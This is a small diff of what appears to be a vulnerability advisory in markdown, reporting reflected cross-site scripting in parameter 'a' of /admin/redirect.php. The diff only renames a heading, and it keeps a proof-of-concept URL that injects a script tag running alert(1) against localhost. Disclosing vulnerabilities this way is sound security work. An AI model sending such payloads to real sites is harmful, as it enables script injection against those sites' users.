@@ -8,7 +8,7 @@
 
 # 1./admin/redirect.php Parameter a has xss
 
-### Sample request POC #1
+### POC #1
 
 ```
 http://localhost:8001/admin/redirect.php?a=%3Cscript%3Ealert(1)%3C/script%3E
